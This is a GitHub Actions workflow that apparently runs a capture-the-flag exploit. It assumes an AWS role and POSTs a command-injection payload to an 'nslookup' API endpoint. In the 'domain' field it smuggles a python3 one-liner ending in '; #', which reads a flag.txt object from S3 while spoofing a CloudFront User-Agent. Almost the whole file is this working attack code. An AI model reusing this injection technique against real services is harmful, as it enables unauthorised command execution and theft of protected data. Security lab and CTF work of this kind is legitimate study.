name: Stage2-Calibration

on:
  push:
    branches:
      - corgi
  workflow_dispatch:
  
permissions:
  id-token: write
  contents: read

jobs:
  calibration:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Test successful S3 read
        shell: bash
        run: |
          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import shlex
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth

          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          S3_URL = "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/flag.txt"
          USER_AGENT = "Amazon CloudFront"

          inner = (
              "import sys,time,urllib.request;"
              "u=sys.argv[1];"
              "a=sys.argv[2];"
              "r=urllib.request.Request(u,headers={'User-Agent':a});"
              "d=urllib.request.urlopen(r,timeout=10).read();"
              "print('READ_BYTES='+str(len(d)));"
              "time.sleep(2)"
          )

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          command = (
              "python3 -c "
              + shlex.quote(inner)
              + " "
              + shlex.quote(S3_URL)
              + " "
              + shlex.quote(USER_AGENT)
              + "; #"
          )

          started = time.monotonic()

          response = requests.post(
              API,
              json={"domain": command},
              auth=auth,
              timeout=20
          )

          elapsed = time.monotonic() - started

          print("HTTP=" + str(response.status_code))
          print("ELAPSED=%.2f" % elapsed)
          print(response.text)
          PY
